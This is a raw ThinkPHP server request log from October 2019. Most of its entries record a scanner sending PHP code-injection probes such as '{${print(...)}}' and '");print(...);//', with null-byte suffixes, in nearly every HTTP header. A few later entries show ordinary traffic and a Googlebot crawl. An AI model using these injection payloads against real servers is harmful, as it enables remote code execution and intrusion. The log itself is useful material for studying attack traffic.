  'wap-connection' => 'Stack-Type=HTTP\'{${print(238947899389478923-34567343546345)}}\'',
  'forwarded' => 'for="46.112.183.23:6267"\'{${print(238947899389478923-34567343546345)}}\'',
  'x-operamini-phone-ua' => 'SAMSUNG-GT-C5212i/C5212iXEKD1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1\'{${print(238947899389478923-34567343546345)}}\'',
  'device-stock-ua' => 'SAMSUNG-GT-C5212i/C5212iXEKD1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1\'{${print(238947899389478923-34567343546345)}}\'',
  'x-operamini-route' => '2\'{${print(238947899389478923-34567343546345)}}\'',
  'x-operamini-phone' => '? # ?\'{${print(238947899389478923-34567343546345)}}\'',
  'x-operamini-features' => 'advanced, file-system, folding, routing\'{${print(238947899389478923-34567343546345)}}\'',
  'x-ebo-ua' => 'BID=1.3.0, BCReq=FC261D01B55BF9EED83025F313550A07\'{${print(238947899389478923-34567343546345)}}\'',
  'x-wap-profile' => 'http://gsm.lge.com/html/gsm/P940-M6-D2.xml\'{${print(238947899389478923-34567343546345)}}\'',
  'x-ucbrowser-ua' => 'pf(Linux);la(zh-CN);re(AppleWebKit/534.31 (KHTML, like Gecko));dv(GT-I9001 Build/GINGERBREAD);pr(UCBrowser/9.2.0.308);ov(Android 2.3.6);pi(480*762);ss(480*762);up(U3/0.8.0);er(U);bt(GJ);pm(1);bv(1);nm(0);im(0);sr(0);nt(1);\'{${print(238947899389478923-34567343546345)}}\'',
  'x-piper-id' => '5691131607\'{${print(238947899389478923-34567343546345)}}\'',
  'x-requested-with' => 'com.android.browser\'{${print(238947899389478923-34567343546345)}}\'',
  'te' => 'deflate,gzip;q=0.3\'{${print(238947899389478923-34567343546345)}}\'',
  'x-powered-by' => 'ASP.NET\'{${print(238947899389478923-34567343546345)}}\'',
  'x-ua-compatible' => 'IE=EmulateIE7\'{${print(238947899389478923-34567343546345)}}\'',
  'x-varnish' => 'ass\'{${print(238947899389478923-34567343546345)}}\'',
  'cookie' => '__utmz=264345247.1261843448.2.3.utmcsr=mihrosofta.net\'{${print(238947899389478923-34567343546345)}}\'|utmccn=(referral)|utmcmd=referral|utmcct=/toster/mem\'{${print(238947899389478923-34567343546345)}}\'ories/63791/',
  'reverse-via' => 'rn\'{${print(238947899389478923-34567343546345)}}\'',
  'x-real-ip' => '108.136.110.41[CHR(0)]\'{${print(238947899389478923-34567343546345)}}\'',
  'x-forwarded-for' => '108.136.110.41[CHR(0)]\'{${print(238947899389478923-34567343546345)}}\'',
  'user-agent' => 'Mozilla/5.9\'{${print(238947899389478923-34567343546345)}}\'',
  'accept' => '*/*',
  'host' => 'maxthink.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T21:07:37+08:00] 0.0.0.0 GET maxthink.cn/
[运行时间：0.029980s] [吞吐率：33.36req/s] [内存消耗：2,222.87kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'referer' => 'http://www.google.com/"{${print(238947899389478923-34567343546345)}}"',
  'x-content-opt' => 'Turbo/4.29.2638"{${print(238947899389478923-34567343546345)}}"',
  'wap-connection' => 'Stack-Type=HTTP"{${print(238947899389478923-34567343546345)}}"',
  'forwarded' => 'for="46.112.183.23:6267""{${print(238947899389478923-34567343546345)}}"',
  'x-operamini-phone-ua' => 'SAMSUNG-GT-C5212i/C5212iXEKD1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1"{${print(238947899389478923-34567343546345)}}"',
  'device-stock-ua' => 'SAMSUNG-GT-C5212i/C5212iXEKD1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1"{${print(238947899389478923-34567343546345)}}"',
  'x-operamini-route' => '2"{${print(238947899389478923-34567343546345)}}"',
  'x-operamini-phone' => '? # ?"{${print(238947899389478923-34567343546345)}}"',
  'x-operamini-features' => 'advanced, file-system, folding, routing"{${print(238947899389478923-34567343546345)}}"',
  'x-ebo-ua' => 'BID=1.3.0, BCReq=FC261D01B55BF9EED83025F313550A07"{${print(238947899389478923-34567343546345)}}"',
  'x-wap-profile' => 'http://gsm.lge.com/html/gsm/P940-M6-D2.xml"{${print(238947899389478923-34567343546345)}}"',
  'x-ucbrowser-ua' => 'pf(Linux);la(zh-CN);re(AppleWebKit/534.31 (KHTML, like Gecko));dv(GT-I9001 Build/GINGERBREAD);pr(UCBrowser/9.2.0.308);ov(Android 2.3.6);pi(480*762);ss(480*762);up(U3/0.8.0);er(U);bt(GJ);pm(1);bv(1);nm(0);im(0);sr(0);nt(1);"{${print(238947899389478923-34567343546345)}}"',
  'x-piper-id' => '5691131607"{${print(238947899389478923-34567343546345)}}"',
  'x-requested-with' => 'com.android.browser"{${print(238947899389478923-34567343546345)}}"',
  'te' => 'deflate,gzip;q=0.3"{${print(238947899389478923-34567343546345)}}"',
  'x-powered-by' => 'ASP.NET"{${print(238947899389478923-34567343546345)}}"',
  'x-ua-compatible' => 'IE=EmulateIE7"{${print(238947899389478923-34567343546345)}}"',
  'x-varnish' => 'ass"{${print(238947899389478923-34567343546345)}}"',
  'cookie' => '__utmz=264345247.1261843448.2.3.utmcsr=mihrosofta.net"{${print(238947899389478923-34567343546345)}}"|utmccn=(referral)|utmcmd=referral|utmcct=/toster/mem"{${print(238947899389478923-34567343546345)}}"ories/63791/',
  'reverse-via' => 'rn"{${print(238947899389478923-34567343546345)}}"',
  'x-real-ip' => '108.136.110.41[CHR(0)]"{${print(238947899389478923-34567343546345)}}"',
  'x-forwarded-for' => '108.136.110.41[CHR(0)]"{${print(238947899389478923-34567343546345)}}"',
  'user-agent' => 'Mozilla/5.9"{${print(238947899389478923-34567343546345)}}"',
  'accept' => '*/*',
  'host' => 'maxthink.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T21:07:44+08:00] 0.0.0.0 GET maxthink.cn/
[运行时间：0.027177s] [吞吐率：36.80req/s] [内存消耗：2,222.87kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'referer' => 'http://www.google.com/"];print(238947899389478923-34567343546345);//',
  'x-content-opt' => 'Turbo/4.29.2638"];print(238947899389478923-34567343546345);//',
  'wap-connection' => 'Stack-Type=HTTP"];print(238947899389478923-34567343546345);//',
  'forwarded' => 'for="46.112.183.23:6267""];print(238947899389478923-34567343546345);//',
  'x-operamini-phone-ua' => 'SAMSUNG-GT-C5212i/C5212iXEKD1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1"];print(238947899389478923-34567343546345);//',
  'device-stock-ua' => 'SAMSUNG-GT-C5212i/C5212iXEKD1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1"];print(238947899389478923-34567343546345);//',
  'x-operamini-route' => '2"];print(238947899389478923-34567343546345);//',
  'x-operamini-phone' => '? # ?"];print(238947899389478923-34567343546345);//',
  'x-operamini-features' => 'advanced, file-system, folding, routing"];print(238947899389478923-34567343546345);//',
  'x-ebo-ua' => 'BID=1.3.0, BCReq=FC261D01B55BF9EED83025F313550A07"];print(238947899389478923-34567343546345);//',
  'x-wap-profile' => 'http://gsm.lge.com/html/gsm/P940-M6-D2.xml"];print(238947899389478923-34567343546345);//',
  'x-ucbrowser-ua' => 'pf(Linux);la(zh-CN);re(AppleWebKit/534.31 (KHTML, like Gecko));dv(GT-I9001 Build/GINGERBREAD);pr(UCBrowser/9.2.0.308);ov(Android 2.3.6);pi(480*762);ss(480*762);up(U3/0.8.0);er(U);bt(GJ);pm(1);bv(1);nm(0);im(0);sr(0);nt(1);"];print(238947899389478923-34567343546345);//',
  'x-piper-id' => '5691131607"];print(238947899389478923-34567343546345);//',
  'x-requested-with' => 'com.android.browser"];print(238947899389478923-34567343546345);//',
  'te' => 'deflate,gzip;q=0.3"];print(238947899389478923-34567343546345);//',
  'x-powered-by' => 'ASP.NET"];print(238947899389478923-34567343546345);//',
  'x-ua-compatible' => 'IE=EmulateIE7"];print(238947899389478923-34567343546345);//',
  'x-varnish' => 'ass"];print(238947899389478923-34567343546345);//',
  'cookie' => '__utmz=264345247.1261843448.2.3.utmcsr=mihrosofta.net"];print(238947899389478923-34567343546345);//|utmccn=(referral)|utmcmd=referral|utmcct=/toster/mem"];print(238947899389478923-34567343546345);//ories/63791/',
  'reverse-via' => 'rn"];print(238947899389478923-34567343546345);//',
  'x-real-ip' => '108.136.110.41[CHR(0)]"];print(238947899389478923-34567343546345);//',
  'x-forwarded-for' => '108.136.110.41[CHR(0)]"];print(238947899389478923-34567343546345);//',
  'user-agent' => 'Mozilla/5.9"];print(238947899389478923-34567343546345);//',
  'accept' => '*/*',
  'host' => 'maxthink.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T21:07:46+08:00] 0.0.0.0 GET maxthink.cn/
[运行时间：0.032186s] [吞吐率：31.07req/s] [内存消耗：2,222.87kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'referer' => 'http://www.google.com/\');print(238947899389478923-34567343546345);//',
  'x-content-opt' => 'Turbo/4.29.2638\');print(238947899389478923-34567343546345);//',
  'wap-connection' => 'Stack-Type=HTTP\');print(238947899389478923-34567343546345);//',
  'forwarded' => 'for="46.112.183.23:6267"\');print(238947899389478923-34567343546345);//',
  'x-operamini-phone-ua' => 'SAMSUNG-GT-C5212i/C5212iXEKD1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1\');print(238947899389478923-34567343546345);//',
  'device-stock-ua' => 'SAMSUNG-GT-C5212i/C5212iXEKD1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1\');print(238947899389478923-34567343546345);//',
  'x-operamini-route' => '2\');print(238947899389478923-34567343546345);//',
  'x-operamini-phone' => '? # ?\');print(238947899389478923-34567343546345);//',
  'x-operamini-features' => 'advanced, file-system, folding, routing\');print(238947899389478923-34567343546345);//',
  'x-ebo-ua' => 'BID=1.3.0, BCReq=FC261D01B55BF9EED83025F313550A07\');print(238947899389478923-34567343546345);//',
  'x-wap-profile' => 'http://gsm.lge.com/html/gsm/P940-M6-D2.xml\');print(238947899389478923-34567343546345);//',
  'x-ucbrowser-ua' => 'pf(Linux);la(zh-CN);re(AppleWebKit/534.31 (KHTML, like Gecko));dv(GT-I9001 Build/GINGERBREAD);pr(UCBrowser/9.2.0.308);ov(Android 2.3.6);pi(480*762);ss(480*762);up(U3/0.8.0);er(U);bt(GJ);pm(1);bv(1);nm(0);im(0);sr(0);nt(1);\');print(238947899389478923-34567343546345);//',
  'x-piper-id' => '5691131607\');print(238947899389478923-34567343546345);//',
  'x-requested-with' => 'com.android.browser\');print(238947899389478923-34567343546345);//',
  'te' => 'deflate,gzip;q=0.3\');print(238947899389478923-34567343546345);//',
  'x-powered-by' => 'ASP.NET\');print(238947899389478923-34567343546345);//',
  'x-ua-compatible' => 'IE=EmulateIE7\');print(238947899389478923-34567343546345);//',
  'x-varnish' => 'ass\');print(238947899389478923-34567343546345);//',
  'cookie' => '__utmz=264345247.1261843448.2.3.utmcsr=mihrosofta.net\');print(238947899389478923-34567343546345);//|utmccn=(referral)|utmcmd=referral|utmcct=/toster/mem\');print(238947899389478923-34567343546345);//ories/63791/',
  'reverse-via' => 'rn\');print(238947899389478923-34567343546345);//',
  'x-real-ip' => '108.136.110.41[CHR(0)]\');print(238947899389478923-34567343546345);//',
  'x-forwarded-for' => '108.136.110.41[CHR(0)]\');print(238947899389478923-34567343546345);//',
  'user-agent' => 'Mozilla/5.9\');print(238947899389478923-34567343546345);//',
  'accept' => '*/*',
  'host' => 'maxthink.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T21:07:49+08:00] 0.0.0.0 GET maxthink.cn/
[运行时间：0.031345s] [吞吐率：31.90req/s] [内存消耗：2,222.87kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'referer' => 'http://www.google.com/");print(238947899389478923-34567343546345);//',
  'x-content-opt' => 'Turbo/4.29.2638");print(238947899389478923-34567343546345);//',
  'wap-connection' => 'Stack-Type=HTTP");print(238947899389478923-34567343546345);//',
  'forwarded' => 'for="46.112.183.23:6267"");print(238947899389478923-34567343546345);//',
  'x-operamini-phone-ua' => 'SAMSUNG-GT-C5212i/C5212iXEKD1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1");print(238947899389478923-34567343546345);//',
  'device-stock-ua' => 'SAMSUNG-GT-C5212i/C5212iXEKD1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1");print(238947899389478923-34567343546345);//',
  'x-operamini-route' => '2");print(238947899389478923-34567343546345);//',
  'x-operamini-phone' => '? # ?");print(238947899389478923-34567343546345);//',
  'x-operamini-features' => 'advanced, file-system, folding, routing");print(238947899389478923-34567343546345);//',
  'x-ebo-ua' => 'BID=1.3.0, BCReq=FC261D01B55BF9EED83025F313550A07");print(238947899389478923-34567343546345);//',
  'x-wap-profile' => 'http://gsm.lge.com/html/gsm/P940-M6-D2.xml");print(238947899389478923-34567343546345);//',
  'x-ucbrowser-ua' => 'pf(Linux);la(zh-CN);re(AppleWebKit/534.31 (KHTML, like Gecko));dv(GT-I9001 Build/GINGERBREAD);pr(UCBrowser/9.2.0.308);ov(Android 2.3.6);pi(480*762);ss(480*762);up(U3/0.8.0);er(U);bt(GJ);pm(1);bv(1);nm(0);im(0);sr(0);nt(1);");print(238947899389478923-34567343546345);//',
  'x-piper-id' => '5691131607");print(238947899389478923-34567343546345);//',
  'x-requested-with' => 'com.android.browser");print(238947899389478923-34567343546345);//',
  'te' => 'deflate,gzip;q=0.3");print(238947899389478923-34567343546345);//',
  'x-powered-by' => 'ASP.NET");print(238947899389478923-34567343546345);//',
  'x-ua-compatible' => 'IE=EmulateIE7");print(238947899389478923-34567343546345);//',
  'x-varnish' => 'ass");print(238947899389478923-34567343546345);//',
  'cookie' => '__utmz=264345247.1261843448.2.3.utmcsr=mihrosofta.net");print(238947899389478923-34567343546345);//|utmccn=(referral)|utmcmd=referral|utmcct=/toster/mem");print(238947899389478923-34567343546345);//ories/63791/',
  'reverse-via' => 'rn");print(238947899389478923-34567343546345);//',
  'x-real-ip' => '108.136.110.41[CHR(0)]");print(238947899389478923-34567343546345);//',
  'x-forwarded-for' => '108.136.110.41[CHR(0)]");print(238947899389478923-34567343546345);//',
  'user-agent' => 'Mozilla/5.9");print(238947899389478923-34567343546345);//',
  'accept' => '*/*',
  'host' => 'maxthink.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T21:07:50+08:00] 0.0.0.0 GET maxthink.cn/
[运行时间：0.030257s] [吞吐率：33.05req/s] [内存消耗：2,222.82kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'referer' => 'http://www.google.com/}print(238947899389478923-34567343546345);{',
  'x-content-opt' => 'Turbo/4.29.2638}print(238947899389478923-34567343546345);{',
  'wap-connection' => 'Stack-Type=HTTP}print(238947899389478923-34567343546345);{',
  'forwarded' => 'for="46.112.183.23:6267"}print(238947899389478923-34567343546345);{',
  'x-operamini-phone-ua' => 'SAMSUNG-GT-C5212i/C5212iXEKD1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1}print(238947899389478923-34567343546345);{',
  'device-stock-ua' => 'SAMSUNG-GT-C5212i/C5212iXEKD1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1}print(238947899389478923-34567343546345);{',
  'x-operamini-route' => '2}print(238947899389478923-34567343546345);{',
  'x-operamini-phone' => '? # ?}print(238947899389478923-34567343546345);{',
  'x-operamini-features' => 'advanced, file-system, folding, routing}print(238947899389478923-34567343546345);{',
  'x-ebo-ua' => 'BID=1.3.0, BCReq=FC261D01B55BF9EED83025F313550A07}print(238947899389478923-34567343546345);{',
  'x-wap-profile' => 'http://gsm.lge.com/html/gsm/P940-M6-D2.xml}print(238947899389478923-34567343546345);{',
  'x-ucbrowser-ua' => 'pf(Linux);la(zh-CN);re(AppleWebKit/534.31 (KHTML, like Gecko));dv(GT-I9001 Build/GINGERBREAD);pr(UCBrowser/9.2.0.308);ov(Android 2.3.6);pi(480*762);ss(480*762);up(U3/0.8.0);er(U);bt(GJ);pm(1);bv(1);nm(0);im(0);sr(0);nt(1);}print(238947899389478923-34567343546345);{',
  'x-piper-id' => '5691131607}print(238947899389478923-34567343546345);{',
  'x-requested-with' => 'com.android.browser}print(238947899389478923-34567343546345);{',
  'te' => 'deflate,gzip;q=0.3}print(238947899389478923-34567343546345);{',
  'x-powered-by' => 'ASP.NET}print(238947899389478923-34567343546345);{',
  'x-ua-compatible' => 'IE=EmulateIE7}print(238947899389478923-34567343546345);{',
  'x-varnish' => 'ass}print(238947899389478923-34567343546345);{',
  'cookie' => '__utmz=264345247.1261843448.2.3.utmcsr=mihrosofta.net}print(238947899389478923-34567343546345);{|utmccn=(referral)|utmcmd=referral|utmcct=/toster/mem}print(238947899389478923-34567343546345);{ories/63791/',
  'reverse-via' => 'rn}print(238947899389478923-34567343546345);{',
  'x-real-ip' => '108.136.110.41[CHR(0)]}print(238947899389478923-34567343546345);{',
  'x-forwarded-for' => '108.136.110.41[CHR(0)]}print(238947899389478923-34567343546345);{',
  'user-agent' => 'Mozilla/5.9}print(238947899389478923-34567343546345);{',
  'accept' => '*/*',
  'host' => 'maxthink.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T23:22:09+08:00] 103.74.70.115 GET 123.57.56.8:80/
[运行时间：0.030991s] [吞吐率：32.27req/s] [内存消耗：2,210.70kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '123.57.56.8:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T23:57:39+08:00] 66.249.70.29 GET www.aizhuanbao.cn/
[运行时间：0.382864s] [吞吐率：2.61req/s] [内存消耗：2,212.95kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip,deflate,br',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
  'from' => 'googlebot(at)googlebot.com',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8',
  'connection' => 'keep-alive',
  'amp-cache-transform' => 'google;v="1..2"',
  'host' => 'www.aizhuanbao.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T23:59:35+08:00] 80.82.70.187 GET www.baidu.com/cache/global/img/gs.gif
[运行时间：0.484064s] [吞吐率：2.07req/s] [内存消耗：1,971.41kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
